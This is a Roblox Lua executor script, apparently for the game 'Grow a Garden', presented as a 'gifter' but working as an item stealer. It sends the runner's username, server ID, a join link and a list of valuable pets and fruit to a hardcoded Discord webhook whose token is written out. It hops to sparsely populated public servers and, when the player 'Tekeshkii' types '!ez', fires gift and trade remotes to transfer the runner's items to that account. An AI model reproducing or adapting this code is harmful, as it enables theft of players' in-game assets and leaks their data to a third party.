-- Grow a Garden Tekeshkii Exclusive Gifter
local RECIPIENT_NAME = "Tekeshkii" -- Hardcoded to only gift to you
local WEBHOOK_URL = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"
local GIFT_COOLDOWN = 1.0
local SERVER_CHECK_INTERVAL = 30 -- Seconds between server checks
local TARGET_PLAYER_RANGE = {1, 3} -- 1-3 players ideal
local ACTIVATION_PHRASE = "!ez" -- Tekeshkii's activation command

-- Target items (only pets and candy blossom)
local TARGET_ITEMS = {
    Pets = {"dragonfly", "raccoon", "queen bee", "disco bee", "red fox"},
    Fruits = {"candy blossom"}
}

-- Services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local TextChatService = game:GetService("TextChatService")

-- Variables
local lp = Players.LocalPlayer
local Backpack = lp:WaitForChild("Backpack")
local Recipient = nil
local GiftRemotes = {}
local currentJobId = game.JobId
local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local isActive = true

-- Generate game link with JobID
local function getGameLink()
    return string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", 
        game.PlaceId, currentJobId)
end

-- Enhanced Discord notification
local function notify(message, color)
    local embed = {
        title = "🌸 Tekeshkii Gifter | "..gameName,
        description = message,
        color = color or 0xFF69B4,
        url = getGameLink(),
        fields = {
            {name = "👤 Executor", value = lp.Name, inline = true},
            {name = "👥 Players", value = #Players:GetPlayers().."/"..game.Players.MaxPlayers, inline = true},
            {name = "🆔 Job ID", value = currentJobId, inline = true},
            {name = "🔗 Game Link", value = "[Click to Join]("..getGameLink()..")", inline = false}
        },
        footer = {text = os.date("%X")}
    }

    -- Add inventory if available
    local inventory = {}
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            for _, pet in ipairs(TARGET_ITEMS.Pets) do
                if name:find(pet:lower()) then
                    table.insert(inventory, "🐾 "..item.Name)
                    break
                end
            end
            for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
                if name:find(fruit:lower()) then
                    table.insert(inventory, "🍬 "..item.Name)
                    break
                end
            end
        end
    end

    if #inventory > 0 then
        table.insert(embed.fields, {
            name = "📦 Inventory ("..#inventory..")",
            value = table.concat(inventory, "\n"),
            inline = false
        })
    end

    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request
        if req then
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = {embed}})
            })
        end
    end)
end

-- Find optimal public server
local function findOptimalServer()
    local request = (syn and syn.request) or (http and http.request) or http_request
    if not request then return false end
    
    local success, response = pcall(function()
        return request({
            Url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100",
            Method = "GET"
        })
    end)
    
    if success and response and response.Body then
        local data = HttpService:JSONDecode(response.Body)
        for _, server in ipairs(data.data) do
            if server.playing >= TARGET_PLAYER_RANGE[1] and 
               server.playing <= TARGET_PLAYER_RANGE[2] and 
               server.id ~= currentJobId then
                return server.id
            end
        end
    end
    return false
end

-- Server hop to optimal public server
local function hopToOptimalServer()
    local optimalServer = findOptimalServer()
    if optimalServer then
        notify("🚀 Hopping to optimal server...", 0xFFFF00)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, optimalServer)
        return true
    end
    notify("⚠️ No optimal servers found", 0xFF0000)
    return false
end

-- Verify player is Tekeshkii
local function isTekeshkii(player)
    return player.Name == RECIPIENT_NAME
end

-- Find gifting remotes
local function findGiftRemotes()
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") and (remote.Name:lower():find("gift") or remote.Name:lower():find("trade")) then
            table.insert(GiftRemotes, remote)
        end
    end
end

-- Check if item should be gifted
local function isGiftable(item)
    local name = item.Name:lower()
    for _, pet in ipairs(TARGET_ITEMS.Pets) do
        if name:find(pet:lower()) then return true, "Pet" end
    end
    for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
        if name:find(fruit:lower()) then return true, "Fruit" end
    end
    return false
end

-- Equip item properly
local function safeEquip(item)
    if not lp.Character then return false end
    local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return false end
    
    humanoid:EquipTool(item)
    local timeout = 0
    while humanoid:GetTool() ~= item and timeout < 10 do
        task.wait(0.1)
        timeout = timeout + 1
    end
    return humanoid:GetTool() == item
end

-- Gift item to Tekeshkii
local function giftToTekeshkii(item)
    if not Recipient or not Recipient.Parent then return false end
    
    if not safeEquip(item) then return false end
    
    for _, remote in ipairs(GiftRemotes) do
        pcall(function() remote:FireServer(Recipient, item) end)
        pcall(function() remote:FireServer("Gift", Recipient, item) end)
    end
    
    return true
end

-- Main gifting process
local function startGifting()
    if not Recipient then return end
    
    notify("🎁 Starting Tekeshkii gifting...", 0x00FF00)
    
    -- Gift pets first
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local valid, itemType = isGiftable(item)
            if valid and itemType == "Pet" then
                if giftToTekeshkii(item) then
                    notify("🐾 Gifted pet: "..item.Name, 0xADD8E6)
                    task.wait(GIFT_COOLDOWN)
                end
            end
        end
    end
    
    -- Then gift fruits
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local valid, itemType = isGiftable(item)
            if valid and itemType == "Fruit" then
                if giftToTekeshkii(item) then
                    notify("🍬 Gifted fruit: "..item.Name, 0xADD8E6)
                    task.wait(GIFT_COOLDOWN)
                end
            end
        end
    end
    
    notify("✅ Finished gifting to Tekeshkii", 0x00FF00)
end

-- Chat listener for Tekeshkii
local function setupChatListener()
    -- Modern chat system
    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            if message.TextSource and isTekeshkii(Players:GetPlayerByUserId(message.TextSource.UserId)) then
                if string.lower(message.Text) == string.lower(ACTIVATION_PHRASE) then
                    startGifting()
                end
            end
        end
    else
        -- Legacy chat fallback
        Players.PlayerChatted:Connect(function(player, message)
            if isTekeshkii(player) and string.lower(message) == string.lower(ACTIVATION_PHRASE) then
                startGifting()
            end
        end)
    end
end

-- Player connection handlers
local function onPlayerAdded(player)
    if isTekeshkii(player) then
        Recipient = player
        notify("🎯 Tekeshkii joined the server!", 0x00FF00)
    end
end

local function onPlayerRemoving(player)
    if isTekeshkii(player) then
        Recipient = nil
        notify("⚠️ Tekeshkii left the server", 0xFF0000)
    end
end

-- Server quality monitor
local function monitorServerQuality()
    while task.wait(SERVER_CHECK_INTERVAL) do
        -- Leave private servers immediately
        if game.PrivateServerId ~= "" then
            notify("⛔ Leaving private server...", 0xFF0000)
            hopToOptimalServer()
        end
        
        -- Check for optimal player count
        local playerCount = #Players:GetPlayers()
        if playerCount < TARGET_PLAYER_RANGE[1] or playerCount > TARGET_PLAYER_RANGE[2] then
            notify("🔍 Searching for better server...", 0xFFFF00)
            hopToOptimalServer()
        end
    end
end

-- Initialize systems
notify("⚡ System activated", 0x00FF00)
findGiftRemotes()

-- Check if already in good server
if #Players:GetPlayers() >= TARGET_PLAYER_RANGE[1] and 
   #Players:GetPlayers() <= TARGET_PLAYER_RANGE[2] then
    notify("🌍 Already in optimal server ("..#Players:GetPlayers().." players)", 0x00FF00)
elseif game.PrivateServerId ~= "" then
    notify("⛔ In private server - leaving...", 0xFF0000)
    hopToOptimalServer()
end

-- Check if Tekeshkii is already present
for _, player in ipairs(Players:GetPlayers()) do
    if isTekeshkii(player) then
        Recipient = player
        notify("🎯 Tekeshkii already in server", 0x00FF00)
        break
    end
end

-- Set up event listeners
Players.PlayerAdded:Connect(onPlayerAdded)
Players.PlayerRemoving:Connect(onPlayerRemoving)
setupChatListener()

-- Start monitoring
task.spawn(monitorServerQuality)
